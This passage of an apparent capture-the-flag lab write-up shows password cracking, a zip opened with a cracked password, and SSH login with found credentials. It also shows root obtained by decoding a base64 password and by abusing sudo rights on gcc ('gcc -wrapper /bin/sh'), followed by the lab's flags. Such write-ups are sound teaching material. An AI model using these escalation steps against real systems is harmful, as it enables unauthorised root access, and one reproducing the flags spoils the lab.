1g 0:00:00:00 DONE (2023-08-16 13:35) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Unzip

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ unzip Jordan.zip
Archive:  Jordan.zip
[Jordan.zip] note.txt password:tinkerbell
  inflating: note.txt
 extracting: pass
 
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ cat note.txt

From: Admin
To: Jordan

* Your the greatest of all! Jordan
* 
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ cat pass

ftpuser:NBA_FTP123
```

```bash
sshpass -p 'NBA_FTP123' ssh -o "StrictHostKeyChecking no" ftpuser@10.10.247.184
```

```bash
ftpuser@ubuntu-bionic:~$ id
uid=1006(ftpuser) gid=1007(ftpuser) groups=1007(ftpuser)
```

#### From ftpuser to root

```bash
ftpuser@ubuntu-bionic:~$ find .
.
./.bash_logout
./...
./.../...
./.../.../.pass
./.../passwords
./.profile
./.bashrc
./.cache
./.cache/motd.legal-displayed
./.gnupg
./.gnupg/private-keys-v1.d
```

```bash
ftpuser@ubuntu-bionic:~$ cat ./.../.../.pass

cm9vdDpOQkFfQWRtaW5fc1VwM3JfczNjVXIz
ftpuser@ubuntu-bionic:~$ cat ./.../passwords

Haha Not that Easy!
```

Tried that password but failed, maybe base64?

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ echo 'cm9vdDpOQkFfQWRtaW5fc1VwM3JfczNjVXIz'|base64 -d
root:NBA_Admin_sUp3r_s3cUr3
```

```bash
ftpuser@ubuntu-bionic:~$ su - root
Password:
root@ubuntu-bionic:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Method 2 - Abuse SUID : Find

```bash
jordan@ubuntu-bionic:~$ sudo -l
[sudo] password for jordan:Wh0_Is_JAm3s_I_Am_Th3_All_Tim3_G0at
Matching Defaults entries for jordan on ubuntu-bionic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on ubuntu-bionic:
    (ALL : ALL) /usr/bin/gcc
```

> https://gtfobins.github.io/gtfobins/gcc/#sudo

```bash
jordan@ubuntu-bionic:~$ sudo gcc -wrapper /bin/sh,-s .

# id
uid=0(root) gid=0(root) groups=0(root)
```

# Additional
---

## Get Flags


#### steph

```bash
steph@ubuntu-bionic:~$ find .
...
./.steph/.flg
./.python_history
./.viminfo
steph@ubuntu-bionic:~$ cat ./.steph/.flg
NBA{CurrySharpshooterMVP30}
```

#### jordan

```bash
jordan@ubuntu-bionic:~$ ls -latr
total 44
...
-rw-rw-r-- 1 jordan jordan   40 Aug  2 07:39 flag
drwxr-xr-x 3 root   root   4096 Aug  7 08:00 ...
drwxr-xr-x 8 root   root   4096 Aug  7 08:12 ..
-rw------- 1 jordan jordan  275 Aug 10 06:36 .bash_history
drwx------ 3 jordan jordan 4096 Aug 16 05:30 .gnupg
drwx------ 2 jordan jordan 4096 Aug 16 05:30 .cache
drwx------ 6 jordan jordan 4096 Aug 16 05:30 .

jordan@ubuntu-bionic:~$ cat flag
NBA{Flight23_AboveTheRim-SOARingLegacy}
```

#### root

```bash

# cd ~

# ls -la
total 44
drwx------ 6 jordan jordan 4096 Aug 15 09:31 .
drwxr-xr-x 8 root   root   4096 Aug  7 08:12 ..
drwxr-xr-x 3 root   root   4096 Aug  7 08:00 ...
...
-rw-rw-r-- 1 jordan jordan   40 Aug  2 07:39 flag

# cat flag
NBA{Flight23_AboveTheRim-SOARingLegacy}
```